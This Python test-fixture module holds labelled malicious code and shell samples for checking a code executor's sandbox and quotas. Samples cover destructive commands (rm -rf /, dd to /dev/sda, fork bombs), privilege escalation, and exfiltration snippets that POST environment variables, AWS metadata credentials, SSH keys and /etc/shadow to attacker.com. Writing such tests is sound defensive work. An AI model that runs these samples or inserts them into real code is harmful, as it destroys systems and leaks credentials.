"""
Malicious Code and Shell Samples for Executor Testing.

This module contains a comprehensive collection of malicious code and shell
command samples used to validate the code executor's safety mechanisms and
resource quota enforcement.

WARNING: These samples are for security testing only. Do not execute in 
untrusted environments.

Categories:
1. Resource Exhaustion Attacks (CPU/Memory)
2. Filesystem Abuse (deletion, modification)
3. System Command Injection
4. Network-based Attacks
5. Privilege Escalation Attempts
6. Data Exfiltration
7. Infinite Loops and Hangs
8. Fork Bombs
9. Denial of Service (DoS)
10. Credential/Environment Variable Theft

Purpose: Validate that executor resource limits prevent these attacks
"""


# ============================================================================
# 1. Resource Exhaustion Attacks
# ============================================================================

RESOURCE_EXHAUSTION_SAMPLES = {
    "infinite_loop": '''
# CPU exhaustion via infinite loop
while True:
    x = 1 + 1
''',
    
    "memory_bomb": '''
# Memory exhaustion
data = []
for i in range(10000000):
    data.append("x" * 10000)
''',
    
    "fork_bomb_attempt": '''
import subprocess
import os

# Try to spawn excessive child processes
for i in range(1000):
    subprocess.Popen(['sleep', '100'])
''',
    
    "file_descriptor_exhaustion": '''
# Exhaust file descriptors
import os
fds = []
try:
    while True:
        f = open('/dev/null', 'r')
        fds.append(f)
except:
    pass
''',
}


# ============================================================================
# 2. Filesystem Abuse
# ============================================================================

FILESYSTEM_ABUSE_SAMPLES = {
    "delete_files": '''
import os
import shutil

# Attempt to delete important files
targets = [
    "/etc/passwd",
    "/etc/shadow",
    "/home",
    "/var/lib",
]

for target in targets:
    try:
        if os.path.isdir(target):
            shutil.rmtree(target)
        else:
            os.remove(target)
    except:
        pass
''',
    
    "malicious_file_creation": '''
# Create hundreds of files to exhaust filesystem
for i in range(10000):
    with open(f"/tmp/spam_{i}.txt", "w") as f:
        f.write("x" * 1000000)
''',
    
    "symlink_attack": '''
import os

# Create symlink loops to cause filesystem issues
os.symlink(".", "/tmp/loop")
os.symlink("/", "/tmp/root_link")
''',
}


# ============================================================================
# 3. System Command Injection
# ============================================================================

COMMAND_INJECTION_SAMPLES = {
    "shell_injection": '''
import subprocess
import os

# Attempt command injection via subprocess
subprocess.run("rm -rf /", shell=True)
subprocess.run("cat /etc/passwd | curl http://attacker.com", shell=True)
''',
    
    "privilege_escalation": '''
import subprocess

# Try to escalate privileges
subprocess.run("sudo su", shell=True)
subprocess.run("chmod 777 /etc/passwd", shell=True)
''',
    
    "suid_abuse": '''
import subprocess

# Attempt to exploit SUID binaries
subprocess.run("find / -perm -4000 -exec {} \\;", shell=True)
''',
}


# ============================================================================
# 4. Network-Based Attacks
# ============================================================================

NETWORK_ATTACK_SAMPLES = {
    "port_scanning": '''
import socket

# Scan ports on localhost
for port in range(1, 65535):
    try:
        socket.create_connection(("localhost", port), timeout=0.1)
        print(f"Port {port} open")
    except:
        pass
''',
    
    "dns_enumeration": '''
import socket

# Try DNS resolution of internal hosts
internal_hosts = [
    "169.254.169.254",  # AWS metadata
    "localhost",
    "127.0.0.1",
    "::1",
]

for host in internal_hosts:
    try:
        result = socket.gethostbyname(host)
        print(f"{host}: {result}")
    except:
        pass
''',
    
    "http_request_spam": '''
import urllib.request

# Spam requests to external URL
for i in range(10000):
    try:
        urllib.request.urlopen("http://target.com", timeout=1)
    except:
        pass
''',
}


# ============================================================================
# 5. Privilege Escalation Attempts
# ============================================================================

PRIVILEGE_ESCALATION_SAMPLES = {
    "sudo_bypass": '''
import subprocess

# Attempt to bypass sudo restrictions
subprocess.run("sudo -l", shell=True)
subprocess.run("sudo -i", shell=True)
subprocess.run("sudoedit /etc/sudoers", shell=True)
''',
    
    "capability_abuse": '''
import subprocess

# Try to gain capabilities
subprocess.run("setcap cap_net_raw+ep /tmp/attack", shell=True)
subprocess.run("getcap -r /", shell=True)
''',
    
    "kernel_exploit": '''
# Attempt to load kernel module
import subprocess
subprocess.run("insmod malicious.ko", shell=True)
subprocess.run("modprobe evil_module", shell=True)
''',
}


# ============================================================================
# 6. Data Exfiltration
# ============================================================================

DATA_EXFILTRATION_SAMPLES = {
    "steal_environment": '''
import os
import urllib.request

# Steal environment variables
env_vars = os.environ
data = str(env_vars).encode()
try:
    urllib.request.urlopen(
        "http://attacker.com/exfil",
        data=data,
        timeout=1
    )
except:
    pass
''',
    
    "credential_theft": '''
import subprocess
import urllib.request

# Attempt to steal AWS credentials
try:
    creds = subprocess.check_output(
        "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        shell=True,
        timeout=1
    )
    urllib.request.urlopen(
        "http://attacker.com/creds",
        data=creds,
        timeout=1
    )
except:
    pass
''',
    
    "sensitive_file_read": '''
import urllib.request

# Read and exfiltrate sensitive files
sensitive_files = [
    "/etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "~/.aws/credentials",
    "~/.bashrc",
]

for file_path in sensitive_files:
    try:
        with open(file_path, "r") as f:
            content = f.read()
            urllib.request.urlopen(
                "http://attacker.com/files",
                data=content.encode(),
                timeout=1
            )
    except:
        pass
''',
}


# ============================================================================
# 7. Infinite Loops and Hangs
# ============================================================================

INFINITE_LOOP_SAMPLES = {
    "endless_recursion": '''
def infinite():
    return infinite()

infinite()
''',
    
    "blocking_io": '''
import socket

# Create blocking socket that never receives data
sock = socket.socket()
sock.bind(("localhost", 0))
sock.listen(1)
sock.accept()  # Blocks forever
''',
    
    "sleep_bomb": '''
import time

# Sleep for extremely long time
time.sleep(99999999)
''',
    
    "deadlock_attempt": '''
import threading

lock1 = threading.Lock()
lock2 = threading.Lock()

def thread1():
    lock1.acquire()
    time.sleep(1)
    lock2.acquire()

def thread2():
    lock2.acquire()
    time.sleep(1)
    lock1.acquire()

t1 = threading.Thread(target=thread1)
t2 = threading.Thread(target=thread2)
t1.start()
t2.start()
t1.join()
t2.join()
''',
}


# ============================================================================
# 8. Fork Bombs
# ============================================================================

FORK_BOMB_SAMPLES = {
    "fork_bomb": '''
import os

# Classic fork bomb
while True:
    os.fork()
''',
    
    "concurrent_process_spawn": '''
import subprocess

# Spawn many concurrent processes
for i in range(1000):
    subprocess.Popen(['sleep', '1000'])
''',
    
    "thread_bomb": '''
import threading

# Create excessive threads
for i in range(10000):
    t = threading.Thread(target=lambda: __import__('time').sleep(1000))
    t.start()
''',
}


# ============================================================================
# 9. Denial of Service (DoS)
# ============================================================================

DOS_SAMPLES = {
    "zip_bomb": '''
# Generate compressed bomb (expands to huge size)
import io
import zipfile

data = b"x" * (1024 * 1024 * 1024)  # 1GB
with zipfile.ZipFile("/tmp/bomb.zip", "w") as z:
    z.writestr("bomb.txt", data)
''',
    
    "decompression_bomb": '''
import gzip
import io

# Create highly compressible data
data = b"0" * (1024 * 1024 * 1024)
compressed = gzip.compress(data)

# Decompress to exhaust memory
decompressed = gzip.decompress(compressed)
''',
    
    "regex_dos": '''
import re

# Catastrophic backtracking regex
pattern = r"(a+)+b"
text = "a" * 100

try:
    re.match(pattern, text)  # Will hang
except:
    pass
''',
}


# ============================================================================
# 10. Credential/Environment Variable Theft
# ============================================================================

CREDENTIAL_THEFT_SAMPLES = {
    "env_var_dump": '''
import os
import json

# Dump all environment variables
secrets = {}
for key, value in os.environ.items():
    if any(s in key.upper() for s in ["KEY", "SECRET", "PASSWORD", "TOKEN", "API"]):
        secrets[key] = value

print(json.dumps(secrets, indent=2))
''',
    
    "process_inspection": '''
import subprocess

# Try to inspect other processes
subprocess.run("ps aux", shell=True)
subprocess.run("netstat -an", shell=True)
subprocess.run("lsof -i", shell=True)
''',
    
    "history_theft": '''
import os

# Try to access shell history
history_files = [
    os.path.expanduser("~/.bash_history"),
    os.path.expanduser("~/.zsh_history"),
    os.path.expanduser("~/.history"),
]

for hfile in history_files:
    try:
        with open(hfile, "r") as f:
            content = f.read()
            # Exfiltrate
    except:
        pass
''',
}


# ============================================================================
# Shell-based Malicious Samples
# ============================================================================

SHELL_INJECTION_SAMPLES = {
    "rm_rf": "rm -rf /",
    "delete_home": "rm -rf ~/*",
    "dd_zeros": "dd if=/dev/zero of=/dev/sda",
    "fork_bomb_shell": ":(){ :|:& };:",
    "truncate_system": "truncate -s 0 /etc/*",
    "network_interface_down": "ip link set eth0 down",
    "dns_poison": "echo '0.0.0.0 *.com' >> /etc/hosts",
    "iptables_lockout": "iptables -P INPUT DROP",
    "reboot_command": "reboot -f",
    "shutdown_system": "shutdown -h now",
}


# ============================================================================
# Combined Attack Scenarios
# ============================================================================

ADVANCED_ATTACK_SAMPLES = {
    "privilege_escalation_and_exfil": '''
import subprocess
import os

# Escalate privileges and exfiltrate data
try:
    subprocess.run("sudo cat /etc/shadow > /tmp/pwned", shell=True)
    with open("/tmp/pwned", "rb") as f:
        data = f.read()
    # Exfiltrate to attacker
    subprocess.run(
        "curl -X POST -d @/tmp/pwned http://attacker.com/data",
        shell=True
    )
except:
    pass
''',
    
    "multi_vector_attack": '''
import subprocess
import threading
import os

# Multi-threaded attack on multiple vectors
def exhaust_memory():
    data = []
    while True:
        data.append("x" * 1000000)

def exhaust_cpu():
    while True:
        sum(range(1000000))

def spawn_processes():
    for i in range(1000):
        subprocess.Popen(["sleep", "1000"])

threads = [
    threading.Thread(target=exhaust_memory),
    threading.Thread(target=exhaust_cpu),
    threading.Thread(target=spawn_processes),
]

for t in threads:
    t.start()
''',
}


# ============================================================================
# Utility Functions for Test Runners
# ============================================================================

def get_all_samples() -> dict:
    """Get all malicious samples organized by category."""
    return {
        "resource_exhaustion": RESOURCE_EXHAUSTION_SAMPLES,
        "filesystem_abuse": FILESYSTEM_ABUSE_SAMPLES,
        "command_injection": COMMAND_INJECTION_SAMPLES,
        "network_attacks": NETWORK_ATTACK_SAMPLES,
        "privilege_escalation": PRIVILEGE_ESCALATION_SAMPLES,
        "data_exfiltration": DATA_EXFILTRATION_SAMPLES,
        "infinite_loops": INFINITE_LOOP_SAMPLES,
        "fork_bombs": FORK_BOMB_SAMPLES,
        "dos_attacks": DOS_SAMPLES,
        "credential_theft": CREDENTIAL_THEFT_SAMPLES,
        "shell_injection": SHELL_INJECTION_SAMPLES,
        "advanced_attacks": ADVANCED_ATTACK_SAMPLES,
    }


def get_flat_sample_list() -> dict:
    """Get all samples in a flat list."""
    all_samples = {}
    for category_samples in get_all_samples().values():
        all_samples.update(category_samples)
    return all_samples


if __name__ == "__main__":
    samples = get_all_samples()
    total = sum(len(v) for v in samples.values())
    
    print("Malicious Code Samples for Security Testing")
    print("=" * 50)
    
    for category, examples in samples.items():
        print(f"\n{category.upper()}: {len(examples)} samples")
        for name in examples.keys():
            print(f"  - {name}")
    
    print(f"\nTotal samples: {total}")
    print("\nThese samples are for security testing only!")
    print("DO NOT execute in production environments!")
